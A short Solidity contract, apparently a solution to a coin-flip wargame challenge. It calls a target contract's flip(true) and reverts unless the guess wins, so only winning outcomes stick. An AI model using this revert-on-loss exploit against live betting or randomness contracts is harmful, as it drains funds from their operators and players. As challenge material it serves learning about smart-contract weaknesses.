// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlipAttacker {
    address public immutable target;

    constructor(address _target) {
        target = _target;
    }

    function flipGuesser() public {
        (bool success, bytes memory data) = target.call(
            abi.encodeWithSignature("flip(bool)", true)
        );

        require(success == true);

        bool result = abi.decode(data, (bool));

        require(result == true);
    }
}
